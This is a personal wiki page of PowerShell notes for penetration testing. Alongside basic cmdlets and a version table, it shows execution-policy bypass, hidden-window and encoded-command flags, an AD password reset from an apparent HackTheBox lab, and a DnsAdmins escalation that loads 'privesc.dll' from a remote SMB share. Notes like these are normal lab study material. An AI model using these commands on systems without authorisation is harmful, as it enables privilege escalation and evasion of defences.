Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-02-16T02:32:13-05:00

====== PowerShell ======
Created Sunday 16 February 2020

===== Locations =====
{{{code: lang="texinfo" linenumbers="False"
c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe      # Native
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe       # 32bit  on 64 bit machine
c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe		# According to arch
}}}

* Using the 'Sysnative' folder will help you access 64-bit tools from 32-bit code


===== Versions =====
| Windows version            | PS 1.0 | PS 2.0 | PS 3.0 | PS 4.0 | PS 5.0 | PS 5.1 | PS Core 6 | PS 7 |
|:---------------------------|:-------|:-------|:-------|:-------|:-------|:-------|:----------|:-----|
| Windows XP SP2             | X      |        |        |        |        |        |           |      |
| Windows XP SP3             |        | X      |        |        |        |        |           |      |
| Windows Vista              | X      |        |        |        |        |        |           |      |
| Windows Vista SP 1         |        | X      |        |        |        |        |           |      |
| Windows 7 SP1              |        |        | X      | X      |        |        |           |      |
| Windows 8                  |        |        | X      |        |        |        |           |      |
| Windows 8.1                |        |        |        | X      |        |        |           |      |
| Windows 10                 |        |        |        |        |        | X      |           |      |
| Windows Server 2003 SP1    | X      |        |        |        |        |        |           |      |
| Windows Server 2003 SP2    |        |        |        |        |        |        |           |      |
| Windows Server 2008        | ?      | X      |        |        |        |        |           |      |
| Windows Server 2008 SP1    |        |        | X      |        |        |        |           |      |
| Windows Server 2008 R2 SP1 |        |        |        | X      |        |        |           |      |
| Windows Server 2012        |        |        | X      | X      |        |        |           |      |
| Windows Server 2012 R2     |        |        |        | X      |        |        |           |      |
| Windows Server 2016        |        |        |        |        |        |        |           |      |

? = Optional

===== Usage (for pentesting) =====
{{{code: lang="sh" linenumbers="False"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <script>.ps1
}}}

* Execures <script>.ps1
* Bypasses exection policy
* Does not display a logo
* Is non-interactive
* Does not load user profile before execution

===== Command line arguments =====
{{{code: lang="texinfo" linenumbers="False"
-nop						Shorthand for -NoProfile    			Instructs powershell not to load the user profile scripts, reducing the probability of exec errors
-w hidden					Shorthand for -WindowStyle hidden		Makes sure no window is created on the user's desktop
-e							Shorthand for -EncodedCommand		    Allows us to specify as base64 encoded command as a command line argument
-ExecutionPolicy Bypass												Bypasses the default execution policy, as the default won't allow to execute
-File																Specify a file to run
-NoLogo																Prevents the powershell logo from being shown
-NonInteractive														Prevents the interactive command prompt from being shown
}}}


==== To get info about errors: ====
$Error[1]  | Select-Object  -Property * 
Try changing the 1 if you don't get the right result

==== Create new Directory ====
New-Item -ItemType directory -Path <path>

==== Finding all hidden files in a subdir tree ====
Get-Childitem â€“Path <path> Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Mode -like '*h*' }

==== All users in domain ====
net user

==== Processor Architecture ====
$env:PROCESSOR_ARCHITECTURE

==== View share ====
net view \\your_smb_server_ip

===== Manipulating registry =====
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ (-Name ServerLevelPluginDll) * optional, borks when not present

==== Add user ====
Add-ADuser <username>

==== Change password of user ====
Set-ADAccountPassword -Identity 'CN=turtle,CN=Users,DC=htb,DC=local' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force)
Set-ADAccountPassword -Identity <username> - NewPassword (ConvertTo-SecureString -AsPlainText "<password>" -Force)

==== Find groups of user ====
Get-ADPrincipalGroupMembership <name>| select name
net user rawa [[/domain]]

===== Grepping =====
{{{code: lang="powershell" linenumbers="False"
output | Select-String "<string>"
}}}



==== Run program as administrator (pops prompt) ====
{{{code: lang="sh" linenumbers="False"
powershell.exe Start-Process <cmd> -Verb runAs
}}}


===== Manuipulation exection policy =====
Get list of policies:
{{{code: lang="powershell" linenumbers="False"
Get-ExecutionPolicy -List
}}}


Get policy for current user
{{{code: lang="powershell" linenumbers="False"
Get-ExecutionPolicy -Scope CurrentUser
}}}


Set policy to unrestricted for current user
{{{code: lang="powershell" linenumbers="False"
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
}}}



===== Windows DNS control =====

==== Tell DNS to attach this dll on boot: ====
dnscmd /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll

==== Restarting ====
sc.exe dns stop
sc.exe dns start



===== SEE =====
[[https://docs.microsoft.com/en-us/powershell/scripting/whats-new/cmdlet-versions?view=powershell-7.1|PS 5.1>7.2 CmdLet info]]
[[https://docs.microsoft.com/en-us/previous-versions/powershell/scripting/overview?view=powershell-6|PS 3.0 > 6.0 Documentation]]





